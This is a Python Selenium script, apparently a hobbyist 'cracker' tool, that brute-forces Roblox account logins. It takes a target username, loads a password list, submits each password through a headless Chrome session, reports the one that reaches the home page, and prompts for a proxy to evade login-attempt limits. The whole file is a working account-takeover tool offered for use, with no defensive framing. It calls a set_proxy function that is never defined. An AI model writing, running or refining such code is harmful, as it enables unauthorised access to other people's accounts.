from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import sys
from UIcontrols import Header, Colors, Clear_console

Header()
print("(ver 0.0.3a)")
print(" ")
# v0.0.3
# by RobPyDev updated by Vector_Breach & Aidan_Suhr


def main():
    print(f"{Colors.BLUE}Executing Chrome...{Colors.RESET}")
    time.sleep(1)
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--enable-gpu")
    chrome_options.add_argument("--no-sandbox")
    driver = webdriver.Chrome(options=chrome_options)

    print(f"{Colors.BLUE}Going to login...{Colors.RESET}")
    time.sleep(1)
    driver.get("https://www.roblox.com/login")

    print("")
    print("Please enter target username:")
    username = input(f"{Colors.BLUE}>>> {Colors.RESET}")

    Clear_console()
    Header()
    print(f"{Colors.BLUE}Getting password_list...{Colors.RESET}")
    time.sleep(1)
    with open("/password_list.txt", "r") as f:
        passwords = [line.strip() for line in f.readlines()]

    print(f"{Colors.BLUE}Locating username and pass textboxes...{Colors.RESET}")
    username_input = driver.find_element(By.NAME, 'username')
    password_input = driver.find_element(By.NAME, 'password')
    login_button = driver.find_element(By.ID, 'login-button')

    print(f"{Colors.BLUE}Sending username...{Colors.RESET}")
    username_input.send_keys(username)

    login_attempts = 0

    print(f"{Colors.BLUE}Starting passwords...{Colors.RESET}")
    for password in passwords:
        password_input.send_keys(password)
        print(f"{Colors.YELLOW}> Trying: {password}{Colors.RESET}")


        time.sleep(0.1)

        login_button = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'login-button')))

        login_button.click()

        time.sleep(10)

        if driver.current_url == "https://www.roblox.com/home":
            print(f">> Success - password {password}")
            sys.exit(5)
        else:
            print("")

            while password_input.get_attribute('value') != "":
                password_input.clear()
                time.sleep(0.1)

        login_attempts += 1

        if login_attempts > 5 and login_attempts < 8:
            print(">!> Max login attempts!")
            print(">?> You can add a proxy to continue!")
            ip = input("IP: ")
            port = input("Port: ")
            set_proxy(ip,  port, driver)
            break
main()